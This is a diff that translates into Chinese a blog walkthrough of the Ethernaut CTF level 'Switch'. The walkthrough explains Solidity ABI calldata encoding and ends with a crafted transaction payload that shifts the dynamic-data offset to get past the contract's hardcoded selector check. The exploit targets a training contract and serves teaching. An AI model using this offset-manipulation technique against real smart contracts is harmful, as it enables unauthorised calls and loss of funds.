@@ -2,11 +2,11 @@
 
 ![img](https://img.learnblockchain.cn/attachments/2023/06/HCN5J9Xo648acb726c2fd.webp)
 
-With Ethernaut Switch from [OpenZeppelin](https://www.openzeppelin.com/), you only have these 3 functions that can be called externally: **flipSwitch**, **turnSwitchOn**, and **turnSwitchOff.**
+对于OpenZeppelin的Ethernaut：Switch，您只有这3个可以从外部调用的函数：**flipSwitch**、**turnSwitchOn**和**turnSwitchOff**。
 
-But **flipSwitch** is the only function you can call as **turnSwitchOn** and **turnSwitchOff** can be accessed only if the msg.sender is our contract (because of the **onlyThis** modifier).
+但是**flipSwitch** 是你唯一可以调用的函数，因为**turnSwitchOn**和**turnSwitchOff**只有在msg.sender是我们的合约时才能访问（因为**onlyThis** 限定符）。
 
-Let’s take a look at the function that you could call:
+让我们来看看你可以调用的函数：
 
 ```typescript
  function flipSwitch(bytes memory _data) public onlyOff {
@@ -15,15 +15,15 @@ Let’s take a look at the function that you could call:
     }
 ```
 
-You see that **flipSwitch** has a modifier, **onlyOff**, that performs a check on the calldata.
+你可以看到**flipSwitch**有一个函数限定符**onlyOff**,此函数限定符是用来对调用数据执行检查。
 
 ```typescript
 modifier onlyOff() {
-        // you can use a complex data type to put in memory
+        // 可以使用复杂的数据类型将其放入内存中
         bytes32[1] memory selector;
-        // check that the calldata at position 68 (location of _data)
+        // 检查位置68处的calldata（_data的位置）
         assembly {
-            calldatacopy(selector, 68, 4) // grab function selector from calldata
+            calldatacopy(selector, 68, 4) //从calldata中选择函数选择器
         }
         require(
             selector[0] == offSelector,
@@ -33,13 +33,11 @@ modifier onlyOff() {
     }
 ```
 
-The modifier checks if the data that can be found starting at position 68 and with the length of 4 bytes is the selector of the **turnOffSwitch** function. 
+函数限定符检查从位置68开始并且长度为4字节的数据是否是turnOffSwitch函数的选择器。
 
-At a first look, **flipSwitch** can be called only with the **turnSwitchOff** as data, but by manipulating the [calldata](https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata/) encoding, you’ll see that this affirmation isn’t true.
-
-## Calldata Encoding Essentials for Static Types
-
-The static types are the following:
+乍一看 ,**flipSwitch**只能在**turnSwitchOff**作为数据的情况下调用，但通过操纵[calldata](https://www.quicknode.com/guides/ethereum-development/transactions/ethereum-transaction-calldata/)编码，您会发现这种肯定不是真的。
+## 静态类型的calldata编码要素
+静态类型如下：
 
 - ‘uint’s
 - ‘int’s
@@ -48,7 +46,7 @@ The static types are the following:
 - ‘bytes’-n
 - ‘tuples’
 
-The representation of those types is their representation in hex, padded with zeros to cover a 32 byte slot.
+这些类型的表示是用十六进制表示的，用零填充以覆盖32字节的插槽。
 
 ```
 Input: 23 (uint256)
@@ -61,15 +59,15 @@ Output:
 0x000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f
 ```
 
-## Calldata Encoding Essentials for Dynamic Types(string, bytes and arrays)
+## 动态类型的calldata编码要素(string, bytes and arrays)
 
-For dynamic types, the calldata encoding is based on the following:
+对于动态类型，calldata编码基于以下内容：
 
-- first 32-bytes are for the offset
-- next 32 bytes are for the length
-- and next are for the values
+- 前32个字节用于偏移
+- 接下来的32个字节是长度
+- 继续接下来的是值
 
-### Examples of input
+### 输入示例
 
 1. **Bytes:**
 
@@ -143,7 +141,7 @@ third element value(42):
 000000000000000000000000000000000000000000000000000000000000002a 
 ```
 
-One example of call that you can make to this contract is(NOT the solution):
+一个调用合约方法的示例
 
 ```
 0x
@@ -169,9 +167,9 @@ value:
 20606e1500000000000000000000000000000000000000000000000000000000
 ```
 
-### What Is The Offset?
+### 什么是偏移量？
 
-The offset indicates the start of the data. Data is formed from a length and value. In our example the offset was 20 in hex, which is 32 in decimal. That means that our data starts after the [first 32 bytes ](https://solidity-fr.readthedocs.io/fr/v0.5.0/miscellaneous.html)from the start of the encoding.
+偏移量表示数据的开始。数据由长度和值组成。在我们的例子中，偏移量是十六进制的20，也就是十进制的32。这意味着我们的数据在编码开始后的前32个字节之后开始。
 
 ```typescript
 0000000000000000000000000000000000000000000000000000000000000020
@@ -187,7 +185,7 @@ The offset indicates the start of the data. Data is formed from a length and val
 20606e1500000000000000000000000000000000000000000000000000000000
 ```
 
-Let’s see an example of a function calldata that has both static and dynamic params:
+让我们看一个同时具有静态和动态参数的函数calldata的示例：
 
 ```typescript
 pragma solidity 0.8.19;
@@ -196,20 +194,20 @@ contract Example {
 }
 ```
 
-With the following parameters:
+具有以下参数：
 
 ```
 data: 0x1234
 to: 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
 ```
 
-This will generate the following calldata:
+这将生成以下calldata
 
 ```
 0xbba1b1cd00000000000000000000000000000000000000000000000000000000000000400000000000000000000000005c69bee701ef814a2b6a3edd4b1652cb9cc5aa6f00000000000000000000000000000000000000000000000000000000000000021234000000000000000000000000000000000000000000000000000000000000
 ```
 
-Let’s analyze it:
+让我们来分析一下：
 
 ```
 0x
@@ -230,22 +228,22 @@ value of the 'data' param:
 1234000000000000000000000000000000000000000000000000000000000000
 ```
 
-As you can see in this example, with the help of offset, you can move the data content(length and value) after the address param(to).
+正如您在本例中看到的，在偏移量的帮助下，您可以将地址参数（to）之后的数据内容（长度和值）移动。
 
-In our contract, the check on the calldata is made at a hardcoded value, **68**. So, the solution is to move the data that is checked from the data that is used to make the call.
+在我们的合约中，对calldata的检查是以硬编码值**68**进行的。因此，解决方案是从用于进行调用的数据中移动检查的数据。
 
-The three essential details **to keep in mind about calldata encoding for dynamic types** are:
+关于动态类型的调用数据编码， **需要记住的三个重要细节是**：
 
-1. the existence of the offset (the offset being **the position in the calldata where the actual data of the dynamic type begins**)
-2. By altering the offset, you can manipulate where the calldata value starts
+1. 偏移量的存在（偏移量是调用数据中动态类型的实际数据开始的位置）
+2. 通过更改偏移量，可以操作calldata值的起始位置
 
-**The solution:**
+**解决方案：:**
 
 ```
 await sendTransaction({from: player, to: contract.address, data:"0x30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000"})
 ```
 
-**Explanation**:
+**说明：**:
 
 ```
 function selector:
@@ -267,14 +265,17 @@ data that contains the selector of the function that will be called from our fun
 76227e1200000000000000000000000000000000000000000000000000000000 
 ```
 
-## Conclusion: Ethernaut Switch Level 29 Gives You a Better Understanding of Data Encoding
+## 结论：Ethernaut 的第29关：Switch让您更好地理解数据编码
 
-With this workaround and learning more about this new vulnerability, you’ll level up your EVM and Solidity language skills.
+有了这个解决方法，并了解更多关于这个新漏洞的信息，您将提高EVM和Solidity的语言技能。
 
-If you want to find out solutions to other Ethernaut challenges, check our [GitHub](https://github.com/Softbinator/ethernaut-solutions).
+如果您想找到解决其他Ethernaut挑战的方案，请查看我们的 [GitHub](https://github.com/Softbinator/ethernaut-solutions).
 
-Stay tuned and follow our blog for more practical tips about EVM [smart contracts](https://blog.softbinator.com/check-smart-contract-state-changes-hardhat-tasks/)!
+请继续关注我们的博客，了解有关EVM智能合约的更多实用提示！[smart contracts](https://blog.softbinator.com/check-smart-contract-state-changes-hardhat-tasks/)!
 
 
 
 原文链接：https://blog.softbinator.com/solving-ethernaut-level-29-switch/
+
+
+
